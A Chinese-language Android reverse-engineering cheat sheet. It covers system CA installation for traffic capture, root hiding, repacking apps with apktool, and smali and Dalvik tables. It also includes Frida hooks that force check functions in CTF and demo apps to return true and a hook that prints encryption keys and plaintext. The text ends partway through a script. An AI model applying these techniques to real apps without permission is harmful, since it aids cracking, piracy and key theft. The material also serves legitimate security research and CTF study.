### 抓包

1. 证书（安装到系统CA目录）

```Shell
# 查看证书信息
# PEM
openssl x509 -in ca.crt -text -noout
# DER
openssl x509 -inform DER -in ca.crt -text -noout

# DER格式需要先进行转换
# PEM格式（即base64明文形式）不需要
openssl x509 -inform DER -in cacert.der -out cacert.pem

# 提取公钥
openssl x509 -in ca.crt -pubkey -noout -out ca.pub
openssl x509 -inform DER -in public_key -pubkey -noout -out pubkey.pem

# 反向转换
openssl x509 -outform der -in yak.pem -out yak.der

# 计算哈希
openssl x509 -subject_hash_old -in cacert.pem | head -1

# 重命名
mv cacert.pem 9a5ba575.0

# 复制到系统目录
adb root
adb remount
# 不行的话可以
# mount -o rw,remount /
# 也不好用
# 或者在系统编译阶段将证书加入到system/ca-certificates/files/目录中

adb push 9a5ba575.0 /sdcard/
adb shell
z2_plus:/ # mv /sdcard/9a5ba575.0 /system/etc/security/cacerts/
z2_plus:/ # chmod 644 /system/etc/security/cacerts/9a5ba575.0
z2_plus:/ # touch -t 200901010800 /system/etc/security/cacerts/9a5ba575.0
z2_plus:/ # reboot
```

#### SSL pinning

```
charles抓包会报错：
SSL handshake with client failed: An unknown issue occurred processing the certificate (certificate_unknown)
```
### Root检测

[Shamiko](https://github.com/LSPosed/LSPosed.github.io)

```Shell
# 推荐白名单模式运行 如需分配root权限 需关闭后重启
adb shell
touch /data/adb/shamiko/whitelist
ls -l /data/adb/shamiko/whitelist
# -rw-r--r-- 0B
# 如果不是就改
chmod 644 /data/adb/shamiko/whitelist
```

[Hide-My-Applist](https://github.com/Dr-TSNG/Hide-My-Applist) ：推荐黑名单模式运行 先创建模板再选择应用

[ApplistDetector](https://github.com/Dr-TSNG/ApplistDetector) ：检测隐藏效果的APP


### 禁止网络检查

```Shell
adb shell 'settings put global captive_portal_detection_enabled 0'
adb shell 'settings put global captive_portal_server localhost'
adb shell 'settings put global captive_portal_mode 0'
```

### logcat

- 指定应用

```Shell
adb logcat -s com.example.app
```

- 指定进程

```Shell
adb logcat -p 12345
```

- 指定tag

```Shell
adb logcat -s <tag1> [<tag2> ...] -s <package_name>
```

### 设置代理

```Shell
adb shell 'settings put global http_proxy 10.26.14.222:7890'
adb shell 'settings put global http_proxy :0'

adb shell 'settings put global all_proxy 10.26.14.222:8444'
adb shell 'settings put global all_proxy :0'
```

### 启动程序

```Shell
adb shell 'am start org.lsposed.manager/.ui.activity.MainActivity'
```

### 反编译

```Shell
# 反编译
apktool d app-release.apk -o outdir
# 打包
apktool b demoapp -o demoapp2.apk
apktool b --use-aapt2 demoapp -o demoapp2.apk

# 生成新签名
keytool -genkey -v -keystore my-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias my-alias
# 输入密码和一系列信息生成 my-release-key.jks

# 对齐
zipalign -v -p 4 demoapp2.apk demoapp2-aligned.apk

# 签名
apksigner sign --ks my-release-key.jks --ks-pass pass:123456 --out demoapp2-final.apk demoapp2-aligned.apk

# GUI工具
# https://qwertycube.com/apk-editor-studio/
```

### 动态调试

```Shell
# 使用jeb
# <C-b> 下断点
# 有些变量的值看不到 需要跟到函数里面才能看到
# 有些变量的值需要展开才能看到
```

### 杂项

#### class2dex

```Shell
dx --dex --output=Hello.dex Hello.class
```

#### dex2smali

```Shell
baksmali -o outdir hello.dex
```

#### 查看Java字节码

```Shell
javap -c -classpath . Hello
```

#### 查看Dalvik字节码

```Shell
dexdump -d Hello.dex
```

#### smali类型描述符

| 类型 | 含义 |
| -- | -- |
| v | void |
| Z | boolean |
| B | Byte |
| S | Short |
| C | Char |
| I | Int |
| J | Long |
| F | Float |
| D | Double |
| L | 类 |
| \[ | 数组 |

例子：
1. `[Ljava/lang/String;` 表示Java中的字符串数组
2. `Lpackage/name/ObjectName;->MethodName(III)Z` 表示对象的某个方法，参数是三个整型，返回一个布尔值
3. `method(I[[IILjava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;` 对应的 `Java` 源码应为：`String method(int, int[][], int, String, Object[])`
4. `Lpackage/name/ObjectName;->FieldName:Ljava/lang/String;` 表示类型、字段名和字段类型

#### Dalvik指令集

后缀表示操作数的类型，如

```
-boolean
-byte
-char
-short
-int
-long
-float
-double
-object
-string
-class
-void
```

| 指令 | 含义 |
| -- | -- |
| `nop` | 空指令 |
| `move d, s` | 将s(source)的值赋给d(destination) |
| `move-result d` | 将上一个invoke类型指令的结果赋给d |
| `move-exception e` | 将运行时发生的异常赋给e |
| `return-void` | 返回 |
| `return r` | 返回r(result)的值 |
| `const c, v` | 将v(value)的值赋给c(const) |
| `monitor-enter m` | 给m(mutex)上锁 |
| `monitor-exit m` | 释放m |
| `check-cast o c` | 将o(object)的类型转换为c(class) |
| `instance-of z o c` | o是否可以转换为c?1:0 值赋给z |
| `new-instance o c` | 创建一个c类的o |
| `array-length l a` | 计算a(array)的长度赋给l(length) |
| `new-array a l t` | 创造指定t(type)和l(length)的数组 |
| `filled-new-array {i1, i2, i3}, t` | 填充数组 |
| `filled-new-array/range {i1 ... in}, t` | 填充数组 |
| `fill-array-data a, d` | 填充数组 |
| `arrayop v, a, i` | 设置数组a的i位置的值为v |
| `throw e` | 抛出异常 |
| `goto o` | 无条件跳转偏移量o(offset) |
| `packed-switch v, l` | 分支跳转比较v(value)和分支表l(list) |
| `if-eq v1, v2, offset` | 等于 |
| `if-ne v1, v2, offset` | 不等于 |
| `if-lt v1, v2, offset` | 小于 |
| `if-gt v1, v2, offset` | 大于 |
| `if-le v1, v2, offset` | 小于等于 |
| `if-ge v1, v2, offset` | 大于等于 |
| `if-eqz v, offset` | 等于0 |
| `if-nez v, offset` | 不等于0 |
| `if-ltz v, offset` | 小于0 |
| `if-gtz v, offset` | 大于0 |
| `if-lez v, offset` | 小于等于0 |
| `if-gez v, offset` | 大于等于0 |
| `cmp r, v1, v2` | 比较v1v2结果放到r >1 =0 <-1 |
| `cmpl r, v1, v2` | >-1 =0 <1 |
| `cmpg r, v1, v2` | >1 =0 <-1 |
| `iop/sop` | 字段操作 |
| `invoke {p1, p2, p3}, m` | 方法调用 |
| `a-to-b r, v` | 将值v的格式从b转换到a结果保存到r |
| `neg r v` | 求补 |
| `not r v` | 求反 |
| `add r, v1, v2` | 加 |
| `sub r, v1, v2` | 减 |
| `mul r, v1, v2` | 乘 |
| `div r, v1, v2` | 除 |
| `rem r, v1, v2` | 模 |
| `and r, v1, v2` | 与 |
| `or r, v1, v2` | 或 |
| `xor r, v1, v2` | 异或 |
| `shl r, v1, v2` | 左移 |
| `shr r, v1, v2` | 右移 |
| `ushr r, v1, v2` | 无符号右移 |

#### 通过反射获取ClassLoader中加载的全部类名

```Java
	public static void getClassNameListInClassLoader(ClassLoader classLoader) {
        try {
            Class BaseDexClassLoaderClass = Class.forName("dalvik.system.BaseDexClassLoader");
            Field pathListField = BaseDexClassLoaderClass.getDeclaredField("pathList");
            pathListField.setAccessible(true);
            Object pathListObj = pathListField.get(classLoader);

            Class DexPathListClass = Class.forName("dalvik.system.DexPathList");
            Field dexElementsField = DexPathListClass.getDeclaredField("dexElements");
            dexElementsField.setAccessible(true);
            Object dexElementsObj = dexElementsField.get(pathListObj);

            Object[] elementObjs = (Object[]) dexElementsObj;

            Class elementClass = Class.forName("dalvik.system.DexPathList$Element");
            Field dexFileField = elementClass.getDeclaredField("dexFile");
            dexFileField.setAccessible(true);

            Class DexFileClass = Class.forName("dalvik.system.DexFile");
            // private static native String[] getClassNameList(Object cookie);
            Method getClassNameListMethod = DexFileClass.getDeclaredMethod("getClassNameList", Object.class);
            getClassNameListMethod.setAccessible(true);
            Field mCookieField = DexFileClass.getDeclaredField("mCookie");
            mCookieField.setAccessible(true);
            Field mFileNameField = DexFileClass.getDeclaredField("mFileName");
            mFileNameField.setAccessible(true);

            for (Object elementObj : elementObjs) {
                Object dexFileObj = dexFileField.get(elementObj);
                Object mCookieObj = mCookieField.get(dexFileObj);

                Object classNameListObj = getClassNameListMethod.invoke(dexFileObj, mCookieObj);
                String[] classesName = (String[]) classNameListObj;

                Log.e("inClassLoader", classLoader.toString());
                for (String className : classesName) {
                    Log.e("inClassLoader", "- " + className);
                }
            }
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
    }
```

#### 从内存中加载dex文件的调用过程

- Android 8

```
InMemoryDexClassLoader -> BaseDexClassLoader -> DexPathList (makeInMemoryDexElements) -> DexFile (openInMemoryDexFile) -> art/runtime/native/dalvik_system_DexFile.cc { DexFile_createCookieWithDirectBuffer, DexFile_createCookieWithArray } -> CreateSingleDexFileCookie -> CreateDexFile -> art/runtime/dex_file.cc (Open) -> art/runtime/dex_file.cc (OpenCommon) -> DexFile::DexFile
```

#### 从文件加载dex的调用过程

```
DexClassLoader -> BaseDexClassLoader -> DexPathList (makeDexElements) -> loadDexFile -> DexFile (openDexFile) -> art/runtime/native/dalvik_system_DexFile.cc (DexFile_openDexFileNative) -> art/runtime/oat_file_manager.cc (OpenDexFilesFromOat) -> DexFile::Open -> DexFile::OpenFile -> art/runtime/dex_file.cc (OpenCommon) -> DexFile::DexFile
```

#### 动态加载dex文件demo

```Java
	protected void onCreate(Bundle savedInstanceState) {
		// ... ...
        Context appContext = this.getApplicationContext();
        dynamicLoad(appContext, "/sdcard/demo2.dex");
    }

    public void dynamicLoad(Context context, String dexPath) {
        File optFile = context.getDir("opt_dex", 0);
        File libFile = context.getDir("lib_path", 0);
        ClassLoader parentCL = MainActivity.class.getClassLoader();
        ClassLoader tmpCL = context.getClassLoader();
        DexClassLoader dexCL = new DexClassLoader(dexPath, optFile.getAbsolutePath(), libFile.getAbsolutePath(), parentCL);
        try {
            Class clazz = dexCL.loadClass("com.example.demo2.TestJava");
            Method testFuncMethod = clazz.getDeclaredMethod("testFunc");
            Object demo2Obj = clazz.newInstance();
            testFuncMethod.invoke(demo2Obj);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
    }
```

#### dex文件checksum计算

抽取dex文件指令后需要重新计算并修改dex文件头中的checksum

```python
#! /usr/bin/python2
# -*- coding: utf8 -*-
import binascii  #删除缩进(Tab)

def CalculationVar(srcByte,vara,varb):#删除缩进(Tab)
    varA = vara
    varB = varb
    icount = 0
    listAB = []

    while icount < len(srcByte):
        varA = (varA + srcByte[icount]) % 65521
        varB = (varB + varA) % 65521
        icount += 1

    listAB.append(varA)
    listAB.append(varB)

    return listAB

def getCheckSum(varA,varB): #删除缩进(Tab)
    Output = (varB << 16) + varA
    return Output

if __name__ == '__main__':
    filename = 'demo3.dex'
    f = open(filename, 'rb', True)
    f.seek(0x0c)
    VarA = 1
    VarB = 0
    flag = 0
    CheckSum = 0
    while True:
        srcBytes = []
        for i in range(1024):               #一次只读1024个字节，防止内存占用过大
            ch = f.read(1)
            if not ch:                      #如果读取到末尾，设置标识符，然后退出读取循环
                flag = 1
                break
            else:
                ch = binascii.b2a_hex(ch)              #将字节转为int类型，然后添加到数组中
                ch = str(ch)
                ch = int(ch,16)
                srcBytes.append(ch)
        varList = CalculationVar(srcBytes,VarA,VarB)
        VarA = varList[0]
        VarB = varList[1]
        if flag == 1:
            CheckSum = getCheckSum(VarA,VarB)
            break
    print('[*] DEX FILENAME: '+filename)
    print('[+] CheckSum = '+hex(CheckSum))
```

#### JNI 动态注册

```C++
jint JNICALL
aaa(JNIEnv *env, jobject thiz, jstring str, jint times) {
    return env->GetStringLength(str) * times;
}

// https://developer.android.com/training/articles/perf-jni#native-libraries
JNIEXPORT jint JNI_OnLoad(JavaVM *vm, void *reserved) {
    JNIEnv *env;
    if (vm->GetEnv(reinterpret_cast<void **>(&env), JNI_VERSION_1_6) != JNI_OK) {
        return JNI_ERR;
    }

    jclass clazz = env->FindClass("com/example/demo3/MainActivity");
    if (clazz == nullptr) return JNI_ERR;

    static const JNINativeMethod methods[] = {
            {"getMultipleStringLengthDynamicJNI", "(Ljava/lang/String;I)I",
             reinterpret_cast<void *>(aaa)},
    };
    int rc = env->RegisterNatives(clazz, methods, sizeof(methods) / sizeof(JNINativeMethod));
    if (rc != JNI_OK) return rc;

    return JNI_VERSION_1_6;
}
```

```Java
public native int getMultipleStringLengthDynamicJNI(String str, int times);
```

#### JNI 调用 Java 方法

```Java
    public static String md5(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] messageDigest = md.digest(input.getBytes());
            BigInteger number = new BigInteger(1, messageDigest);
            String result = number.toString(16);
            while (result.length() < 32) {
                result = "0" + result;
            }
            return result;
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return null;
    }

    public String md5NonStatic(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] messageDigest = md.digest(input.getBytes());
            BigInteger number = new BigInteger(1, messageDigest);
            String result = number.toString(16);
            while (result.length() < 32) {
                result = "0" + result;
            }
            return result;
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return null;
    }

	public static native String computeMD5(String input);

    public native String computeMD5NonStatic(String input);
```

```C++
extern "C"
JNIEXPORT jstring JNICALL
Java_com_example_demo3_MainActivity_computeMD5(JNIEnv *env, jclass clazz, jstring input) {
    const char *inputStr = env->GetStringUTFChars(input, nullptr);
    if (inputStr == nullptr) {
        return nullptr; // OutOfMemoryError already thrown by JNI
    }

    jclass targetClass = env->FindClass("com/example/demo3/MainActivity");
    if (targetClass == nullptr) {
        return nullptr; // Class not found exception
    }

    jmethodID targetMethod = env->GetStaticMethodID(targetClass, "md5",
                                                    "(Ljava/lang/String;)Ljava/lang/String;");
    if (targetMethod == nullptr) {
        return nullptr; // Method not found exception
    }

    jstring javaString = env->NewStringUTF(inputStr);
    jstring result = (jstring) env->CallStaticObjectMethod(targetClass, targetMethod, javaString);
    env->ReleaseStringUTFChars(input, inputStr);
    return result;
}
extern "C"
JNIEXPORT jstring JNICALL
Java_com_example_demo3_MainActivity_computeMD5NonStatic(JNIEnv *env, jobject thiz, jstring input) {
    jclass targetClass = env->FindClass("com/example/demo3/MainActivity");
    jmethodID targetMethod = env->GetMethodID(targetClass, "md5NonStatic",
                                              "(Ljava/lang/String;)Ljava/lang/String;");
    jstring result = static_cast<jstring>(env->CallObjectMethod(thiz, targetMethod, input));
    return result;
}
```

#### onCreate函数Native化

```Java
	@Override
    protected native void onCreate(Bundle savedInstanceState);
```

```C++
extern "C"
JNIEXPORT void JNICALL
Java_com_example_demo4_MainActivity_onCreate(JNIEnv *env, jobject thiz,
                                             jobject saved_instance_state) {
    // super.onCreate(savedInstanceState);
    // jclass AppCompatActivity = env->FindClass("androidx/appcompat/app/AppCompatActivity");
    // jclass MainActivity = env->FindClass("com/example/demo4/MainActivity");
    jclass MainActivity = env->GetObjectClass(thiz);
    jclass AppCompatActivity = env->GetSuperclass(MainActivity);
    jclass FragmentActivity = env->GetSuperclass(AppCompatActivity);
    jmethodID onCreate = env->GetMethodID(FragmentActivity, "onCreate", "(Landroid/os/Bundle;)V");
    env->CallNonvirtualVoidMethod(thiz, FragmentActivity, onCreate, saved_instance_state);

    // binding = ActivityMainBinding.inflate(getLayoutInflater());
    env->FindClass("android/app/Activity");
    jmethodID getLayoutInflater = env->GetMethodID(MainActivity, "getLayoutInflater",
                                                   "()Landroid/view/LayoutInflater;");
    jobject layout_inflater = env->CallObjectMethod(thiz, getLayoutInflater);
    // com.example.demo4.databinding.ActivityMainBinding
    jclass ActivityMainBinding = env->FindClass(
            "com/example/demo4/databinding/ActivityMainBinding");
    jmethodID inflate = env->GetStaticMethodID(ActivityMainBinding, "inflate",
                                               "(Landroid/view/LayoutInflater;)Lcom/example/demo4/databinding/ActivityMainBinding;");
    jobject binding = env->CallStaticObjectMethod(ActivityMainBinding, inflate, layout_inflater);

    // setContentView(binding.getRoot());
    jmethodID getRoot = env->GetMethodID(ActivityMainBinding, "getRoot", "()Landroid/view/View;");
    jobject root = env->CallObjectMethod(binding, getRoot);
    jmethodID setContentView = env->GetMethodID(AppCompatActivity, "setContentView",
                                                "(Landroid/view/View;)V");
    env->CallVoidMethod(thiz, setContentView, root);

    // TextView tv = binding.sampleText;
    jfieldID sampleText = env->GetFieldID(ActivityMainBinding, "sampleText",
                                          "Landroid/widget/TextView;");
    jobject tv = env->GetObjectField(binding, sampleText);

    // tv.setText("h3llo");
    jstring text = env->NewStringUTF("h3llo");
    jmethodID setText = env->GetMethodID(env->GetObjectClass(tv), "setText",
                                         "(Ljava/lang/CharSequence;)V");
    env->CallVoidMethod(tv, setText, text);
}
```

#### 动态注册Native化的onCreate函数

```Java
	@Override
    protected native void onCreate(Bundle savedInstanceState);
```

```C++
void ffff(JNIEnv *env, jobject thiz,
                                             jobject saved_instance_state) {
    // super.onCreate(savedInstanceState);
    // jclass AppCompatActivity = env->FindClass("androidx/appcompat/app/AppCompatActivity");
    // jclass MainActivity = env->FindClass("com/example/demo4/MainActivity");
    jclass MainActivity = env->GetObjectClass(thiz);
    jclass AppCompatActivity = env->GetSuperclass(MainActivity);
    jclass FragmentActivity = env->GetSuperclass(AppCompatActivity);
    jmethodID onCreate = env->GetMethodID(FragmentActivity, "onCreate", "(Landroid/os/Bundle;)V");
    env->CallNonvirtualVoidMethod(thiz, FragmentActivity, onCreate, saved_instance_state);

    // binding = ActivityMainBinding.inflate(getLayoutInflater());
    env->FindClass("android/app/Activity");
    jmethodID getLayoutInflater = env->GetMethodID(MainActivity, "getLayoutInflater",
                                                   "()Landroid/view/LayoutInflater;");
    jobject layout_inflater = env->CallObjectMethod(thiz, getLayoutInflater);
    // com.example.demo4.databinding.ActivityMainBinding
    jclass ActivityMainBinding = env->FindClass(
            "com/example/demo4/databinding/ActivityMainBinding");
    jmethodID inflate = env->GetStaticMethodID(ActivityMainBinding, "inflate",
                                               "(Landroid/view/LayoutInflater;)Lcom/example/demo4/databinding/ActivityMainBinding;");
    jobject binding = env->CallStaticObjectMethod(ActivityMainBinding, inflate, layout_inflater);

    // setContentView(binding.getRoot());
    jmethodID getRoot = env->GetMethodID(ActivityMainBinding, "getRoot", "()Landroid/view/View;");
    jobject root = env->CallObjectMethod(binding, getRoot);
    jmethodID setContentView = env->GetMethodID(AppCompatActivity, "setContentView",
                                                "(Landroid/view/View;)V");
    env->CallVoidMethod(thiz, setContentView, root);

    // TextView tv = binding.sampleText;
    jfieldID sampleText = env->GetFieldID(ActivityMainBinding, "sampleText",
                                          "Landroid/widget/TextView;");
    jobject tv = env->GetObjectField(binding, sampleText);

    // tv.setText("h3llo");
    jstring text = env->NewStringUTF("h3llo");
    jmethodID setText = env->GetMethodID(env->GetObjectClass(tv), "setText",
                                         "(Ljava/lang/CharSequence;)V");
    env->CallVoidMethod(tv, setText, text);
}
JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    JNIEnv* env;
    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
        return JNI_ERR;
    }

    // Find your class. JNI_OnLoad is called from the correct class loader context for this to work.
    jclass c = env->FindClass("com/example/demo4/MainActivity");
    if (c == nullptr) return JNI_ERR;

    // Register your class' native methods.
    static const JNINativeMethod methods[] = {
            {"onCreate", "(Landroid/os/Bundle;)V", reinterpret_cast<void*>(ffff)},
    };
    int rc = env->RegisterNatives(c, methods, sizeof(methods)/sizeof(JNINativeMethod));
    if (rc != JNI_OK) return rc;

    return JNI_VERSION_1_6;
}
```

### 破解思路

1. 错误提示信息是关键，通常属于字符串资源，可能硬编码，也可能引用自 `res/values/strings.xml` 文件，其中的内容在打包时会进入 `resources.arsc` 文件。如果反编译成功，就能被解密出来。以 `abc_` 开头的字符串是系统默认生成的，其它都是程序中使用的字符串。搜索错误提示，可以看到其对应的 `name`  ，再搜索 `name` 可以在 `public.xml` 中找到其对应的 `id` ，再搜索其 `id` ，看看是否出现在 `smali` 代码中。

### 日志插桩

```
使用方法：
将com目录以合并的方式复制到smali目录下
需要插桩的位置插入smali代码
invoke-static {v?}, Lcom/mtools/LogUtils;->v(Ljava/lang/Object;)V
在算法助手APP的日志中查看（需要在LSPosed和算法助手中都打开相应开关）
```
### Frida逆向

```shell
# 进程列表
frida-ps -U
# 应用列表
frida-ps -Uai
# 运行中的应用
frida-ps -Ua
# 列出所有设备
frida-ls-devices
# 跟踪本机API
frida-trace -U Twitter -i "*URL*"
# attach模式注入
frida -U -l hook.js com.example.demo
```

#### java层demo

```python
import frida, sys

def on_message(message, data):
    if message['type'] == 'send':
        print("[*] {0}".format(message['payload']))
    else:
        print(message)

jscode = """
Java.perform(() => {
  // 开始定义Hook
  console.log("1. Start Hooking");

  // 指定类
  const MainActivity = Java.use('com.example.seccon2015.rock_paper_scissors.MainActivity');
  console.log("2. Class Found");

  // 指定函数
  const onClick = MainActivity.onClick;
  console.log("3. Function Found");
  
  onClick.implementation = function (v) {
    // 显示函数被调用的信息
    send('onClick');

    // 调用原始函数
    onClick.call(this, v);

    // Set our values after running the original onClick handler
    // 注意这里使用.value来设置值 而不是直接赋值
    this.m.value = 0;
    this.n.value = 1;
    this.cnt.value = 999;

    // Log to the console that it's done, and we should have the flag!
    console.log('Done:' + JSON.stringify(this.cnt));
  };
});
"""

# 通过USB连接到设备 指定进程
process = frida.get_usb_device().attach('com.example.seccon2015.rock_paper_scissors')
# 加载js脚本
script = process.create_script(jscode)
# 也可以从JS文件中加载
# script = process.create_script(open('hook.js', 'r').read())
script.on('message', on_message)
print('[*] Running CTF')
script.load()
sys.stdin.read()
```

#### spawn

```python
import frida, sys

def on_message(message, data):
    if message['type'] == 'send':
        print("[*] {0}".format(message['payload']))
    else:
        print(message)

# 通过USB连接到设备 指定进程
device = frida.get_usb_device()
process = device.spawn(["com.example.application"])
session = device.attach(process)
# 加载JS脚本 hook.js
with open('hook.js', 'r', encoding='utf-8') as f:
    jscode = f.read()
    script = session.create_script(jscode)

script.on('message', on_message)
print('[*] Hooking')
script.load()
device.resume(process)
sys.stdin.read()
```

```javascript
Java.perform(() => {
    // 开始定义Hook
    console.log("\n1. Start Hooking");
    var application = Java.use("android.app.Application");
    application.attach.overload("android.content.Context").implementation = function(context) {
        console.log("2. Hooking attach");
        // 执行原来的方法
        this.attach(context);
        var classLoader = context.getClassLoader();
        var classFactory = Java.ClassFactory.get(classLoader);
        var targetClass = classFactory.use("com.example.application.TargetClass");

        targetClass.target.overload().implementation = function() {
            console.log("3. Hooking target function");
            this.$super.SomeSuperFunc();
        }
    }
});
```

#### 常用操作（重要）

```JavaScript
Java.perform(() => {
    console.log("Start Hooking");

    // target class
    const FridaActivity1 = Java.use("com.example.androiddemo.Activity.FridaActivity1");
    const FridaActivity2 = Java.use("com.example.androiddemo.Activity.FridaActivity2");
    const FridaActivity3 = Java.use("com.example.androiddemo.Activity.FridaActivity3");
    // const FridaActivity4 = Java.use("com.example.androiddemo.Activity.FridaActivity4");
    // inner class
    const FridaActivity4_InnerClasses = Java.use("com.example.androiddemo.Activity.FridaActivity4$InnerClasses");
    const FridaActivity5 = Java.use("com.example.androiddemo.Activity.FridaActivity5");
    const FridaActivity6 = Java.use("com.example.androiddemo.Activity.FridaActivity6");

    // hook static field
    FridaActivity3.static_bool_var.value = true;

    // 枚举内存中的现有实例
    // Java.choose("com.example.androiddemo.Activity.FridaActivity2", {
    //     onMatch: function (instance) {
    //         instance.setBool_var();
    //         instance.bool_var.value = true;
    //     },
    //     onComplete: function () { },
    // });

    // 实例初始化时进行Hook
    FridaActivity2.$init.overload().implementation = function () {
        this.$init();
        // invoke non-static method
        this.setBool_var();
    }

    FridaActivity3.$init.overload().implementation = function () {
        this.$init();
        // hook non-static field
        this.bool_var.value = true;
        // this.same_name_bool_var();
        // 存在同名函数的情况下 加上_前缀
        this._same_name_bool_var.value = true;
        // this.same_name_bool_var();
    }

    // invoke static method
    FridaActivity2.setStatic_bool_var();

    // hook static method
    FridaActivity1.a.implementation = function (bArr) {
        return "R4jSLLLLLLLLLLOrLE7/5B+Z6fsl65yj6BgC6YWz66gO6g2t65Pk6a+P65NK44NNROl0wNOLLLL=";
    };

    // FridaActivity4_InnerClasses.check1.implementation = function () {
    //     return true;
    // }
    // FridaActivity4_InnerClasses.check2.implementation = function () {
    //     return true;
    // }
    // FridaActivity4_InnerClasses.check3.implementation = function () {
    //     return true;
    // }
    // FridaActivity4_InnerClasses.check4.implementation = function () {
    //     return true;
    // }
    // FridaActivity4_InnerClasses.check5.implementation = function () {
    //     return true;
    // }
    // FridaActivity4_InnerClasses.check6.implementation = function () {
    //     return true;
    // }

    // batch hook method
    const methods = FridaActivity4_InnerClasses.class.getDeclaredMethods();
    for (const method of methods) {
        const methodName = method.getName();
        if (methodName.startsWith("check")) {
            FridaActivity4_InnerClasses[methodName].implementation = function () {
                return true;
            }
        }
    }

    // current classloader
    // console.log(Java.classFactory.loader);
    // 记录默认的classloader
    // const temp = Java.classFactory.loader;
    // enumearte methods
    // console.log(JSON.stringify(Java.enumerateMethods("*!check"), null, 2));

    // hook 动态加载的内容
    Java.enumerateClassLoaders({
        onMatch: function (loader) {
            try {
                if (loader.findClass("com.example.androiddemo.Dynamic.DynamicCheck")) {
                    // console.log("DynamicCheck found in " + loader);
                    // 可以修改默认的classloader 后续直接Java.use即可
                    // Java.classFactory.loader = loader;
                    // Java.use("com.example.androiddemo.Dynamic.DynamicCheck").check.implementation = function () {
                    //     return true;
                    // }
                    // 恢复默认的classloader
                    // Java.classFactory.loader = temp;

                    // 也可以通过ClassFactory直接进行交互
                    const classFactory = Java.ClassFactory.get(loader);
                    const DynamicCheck = classFactory.use("com.example.androiddemo.Dynamic.DynamicCheck");
                    DynamicCheck.check.implementation = function () {
                        return true;
                    };
                }
            } catch (e) { }
        },
        onComplete: function () { } // 必须加 不然会报错
    });


    // Java.use("com.example.androiddemo.Activity.Frida6.Frida6Class0").check.implementation = function () { return true };
    // Java.use("com.example.androiddemo.Activity.Frida6.Frida6Class1").check.implementation = function () { return true };
    // Java.use("com.example.androiddemo.Activity.Frida6.Frida6Class2").check.implementation = function () { return true };

    // batch hook loaded classes
    Java.enumerateLoadedClasses({
        onMatch: function (name, _handle) {
            if (name.includes("com.example.androiddemo.Activity.Frida6.Frida6Class")) {
                // console.log(name);
                Java.use(name).check.implementation = function () {
                    return true;
                }
            }
        },
        onComplete: function () { } // 必须加 不然会报错
    });

    // console.log(JSON.stringify(Java.enumerateMethods("*Frida6*!check"), null, 2));

    // enum loaded methods
    // const loaderClassesArray = Java.enumerateMethods("*Frida6*!check");
    // for (const loaderClasses of loaderClassesArray) {
    //     const loader = loaderClasses.loader;
    //     const classFactory = Java.ClassFactory.get(loader);
    //     const classes = loaderClasses.classes;
    //     for (const clazz of classes) {
    //         const className = clazz.name;
    //         classFactory.use(className).check.implementation = function () {
    //             return true;
    //         }
    //     }
    // }

    console.log("End")
});
```

#### Java层自吐算法

```javascript
function bin2hex(array) {
    var result = [];
    var len = array.length;
    for (var i = 0; i < len; i++) {
        result.push(('0' + (array[i] & 0xFF).toString(16)).slice(-2));
    }
    return result.join('');
}

function bin2utf8(array) {
    var result = [];
    for (var i = 0; i < array.length; i++) {
        result.push('%' + ('0' + (array[i] & 0xFF).toString(16)).slice(-2));
    }
    return decodeURIComponent(result.join(''));
}

function bin2base64(array) {
    var base64chars = [];
    var alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
    var len = array.length;

    for (var i = 0; i < len; i += 3) {
        var byte1 = array[i] & 0xFF;
        var byte2 = array[i + 1] & 0xFF;
        var byte3 = array[i + 2] & 0xFF;

        var triplet = (byte1 << 16) | (byte2 << 8) | byte3;

        for (var j = 0; (j < 4) && (i + j * 0.75 < len); j++) {
            base64chars.push(alphabet.charAt((triplet >> (6 * (3 - j))) & 0x3F));
        }
    }

    var padding = alphabet.charAt(64);
    if (padding) {
        while (base64chars.length % 4) {
            base64chars.push(padding);
        }
    }

    return base64chars.join('');
}

Java.perform(function () {
    console.log("\n---- Start hooking ----");

    Java.use('javax.crypto.spec.SecretKeySpec').$init.overload('[B', 'java.lang.String').implementation = function (key, spec) {
        console.log("密钥: " + bin2base64(key));
        return this.$init(key, spec);
    };

    Java.use('javax.crypto.Cipher')['getInstance'].overload('java.lang.String').implementation = function (spec) {
        console.log("加密类型: " + spec);
        return this.getInstance(spec);
    };

    Java.use('javax.crypto.Cipher')['doFinal'].overload('[B').implementation = function (data) {
        console.log("---- crypto ----");
        console.log("输入数据: ");
        console.log(bin2base64(data));
        var result = this.doFinal(data);
        console.log("输出数据: ");
        console.log(bin2base64(result));
        return result;
    };

    Java.use('javax.crypto.Cipher').init.overload('int', 'java.security.Key').implementation = function (opmode, key) {
        var keyWords = key.getEncoded();
        console.log("密钥: " + bin2base64(keyWords));
        return this.init(opmode, key);
    }

    Java.use('javax.crypto.Cipher').init.overload('int', 'java.security.Key', 'java.security.spec.AlgorithmParameterSpec').implementation = function (opmode, key, params) {
        var keyWords = key.getEncoded();
        console.log("密钥: " + bin2base64(keyWords));
        var iv = Java.cast(params, Java.use('javax.crypto.spec.IvParameterSpec')).getIV();
        console.log("IV: " + bin2base64(iv));
        return this.init(opmode, key, params);
    }
});
```

```javascript
Java.perform(function () {
    console.log("\n*** Start hooking ***");

    function showStacks() {
        console.log(
            "调用堆栈：" +
            Java.use("android.util.Log")
                .getStackTraceString(
                    Java.use("java.lang.Throwable").$new()
                )
        );
    }

